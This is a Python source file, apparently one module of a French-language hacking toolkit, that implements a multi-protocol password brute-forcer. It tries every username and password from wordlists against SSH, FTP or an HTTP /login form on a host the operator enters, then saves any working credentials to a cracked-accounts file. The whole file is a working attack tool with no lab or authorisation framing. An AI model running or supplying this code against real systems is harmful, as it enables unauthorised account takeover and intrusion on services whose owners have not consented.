# -*- coding: utf-8 -*-
# Module 4 : brute-force multi-protocole
import socket, os, json, time, ftplib, paramiko
from datetime import datetime
try:
    import requests
except ImportError:
    requests = None

class BruteForcer:
    def __init__(self, host, port, users, passes, protocol="ssh", delay=0):
        self.host = host
        self.port = port
        self.users = users
        self.passes = passes
        self.protocol = protocol
        self.delay = delay
        self.attempts = 0
        self.found = None

    def try_ssh(self, u, p):
        try:
            c = paramiko.SSHClient()
            c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(self.host, port=self.port, username=u, password=p, timeout=3)
            c.close(); return True
        except Exception: return False

    def try_ftp(self, u, p):
        try:
            f = ftplib.FTP()
            f.connect(self.host, self.port, timeout=3)
            f.login(u, p); f.quit(); return True
        except Exception: return False

    def try_http(self, u, p):
        if requests is None: return False
        try:
            r = requests.post(f"http://{self.host}:{self.port}/login",
                              data={"username":u,"password":p}, timeout=5)
            return r.status_code == 200 and "invalid" not in r.text.lower()
        except Exception: return False

    def run(self, progress=True):
        method = {"ssh":self.try_ssh,"ftp":self.try_ftp,"http":self.try_http}[self.protocol]
        for u in self.users:
            for p in self.passes:
                self.attempts += 1
                if progress:
                    print(f"\r  [{self.attempts}] {u}:{p}", end="", flush=True)
                if method(u, p):
                    print()
                    self.found = (u,p); return self.found
                if self.delay: time.sleep(self.delay)
        print()
        return None

def run_interactive():
    from toolkit import ok, err, info, warn, section, ask, C
    section("BRUTE-FORCE MULTI-PROTOCOLE")
    protocol = ask("Protocole (ssh/ftp/http)", "ssh").lower()
    host = ask("Hôte")
    default_port = {"ssh":22,"ftp":21,"http":80}[protocol]
    port = int(ask("Port", str(default_port)))
    ufile = ask("Wordlist utilisateurs", "payloads/wordlist_users.txt")
    pfile = ask("Wordlist mots de passe", "payloads/wordlist_pass.txt")
    if not os.path.exists(ufile) or not os.path.exists(pfile):
        err("Wordlist introuvable"); return
    users = [l.strip() for l in open(ufile) if l.strip()]
    passes = [l.strip() for l in open(pfile) if l.strip()]
    info(f"{len(users)} utilisateurs x {len(passes)} mots de passe = {len(users)*len(passes)} essais")
    bf = BruteForcer(host, port, users, passes, protocol)
    t0 = time.time()
    r = bf.run()
    elapsed = time.time() - t0
    if r:
        ok(f"TROUVÉ : {r[0]}:{r[1]} en {elapsed:.1f}s ({bf.attempts} essais)")
        os.makedirs("output", exist_ok=True)
        with open("output/cracked_accounts.txt","a",encoding="utf-8") as f:
            f.write(f"{protocol} {host}:{port} {r[0]}:{r[1]}\n")
    else:
        err(f"Aucun couple valide ({bf.attempts} essais, {elapsed:.1f}s)")